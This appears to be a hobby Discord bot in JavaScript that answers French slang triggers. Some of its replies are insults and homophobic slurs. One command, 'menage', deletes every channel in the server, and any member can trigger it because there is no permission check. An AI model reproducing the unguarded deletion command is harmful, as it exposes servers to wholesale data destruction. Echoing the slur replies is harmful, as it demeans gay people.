const Discord = require('discord.js');
const { send } = require('process');
const client = new Discord.Client();
const config = require('./config.json');
const { prefix, token } = require('./config.json');


client.once('ready', () => {
	console.log('Ready!');
});


client.login(token)


client.on("message", message => {
    if (message.content === "el pekito") {
      message.channel.send("74")
    }
  })
  client.on("message", message => {
    if (message.content === "tg") {
      message.channel.send("j'avoue ferme la")
    }
  })
  client.on ("message", message => {
    if (message.content=== "oof"){
      message.channel.send("la sauce")
    }
  })
  client.on ("message", message => {
    if (message.content=== "gg"){
      message.channel.send("bg")
    }
  })
  client.on ("message", message => {
    if (message.content=== "sale"){
      message.channel.send("fdp")
    }
  })
  client.on ("message", message => {
    if (message.content=== "bg"){
      message.channel.send("gg")
    }
  })
  client.on ("message", message => {
    if (message.content=== "pd"){
      message.channel.send("de merde")
    }
  }) 
  client.on ("message", message => {
    if (message.content=== `${prefix}menage`){
      message.guild.channels.cache.forEach(channel => channel.delete())
    }
  })
  client.on ("message", message => {
    if (message.content=== "gay"){
      message.channel.send("tes supeeeeeer gayyy")
    }
  })
